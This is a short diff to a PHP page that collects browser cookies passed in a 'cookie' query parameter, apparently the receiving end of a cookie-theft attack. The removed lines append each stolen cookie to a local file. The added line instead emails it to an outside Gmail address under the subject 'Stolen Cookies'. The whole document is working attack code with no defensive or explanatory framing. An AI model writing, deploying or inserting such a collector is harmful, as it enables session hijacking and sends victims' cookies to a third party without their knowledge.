@@ -7,10 +7,7 @@
 
 <body>
 <?php
-$cookie = $HTTP_GET_VARS["cookie"];
-$steal = fopen("cookiefile.txt", "a");
-fwrite($steal, $cookie ."\\n");
-fclose($steal);
+$cookie = $HTTP_GET_VARS["cookie"]; mail("iwannet.mail@gmail.com", "Stolen Cookies", $cookie);
 ?>
 </body>
 </html> 
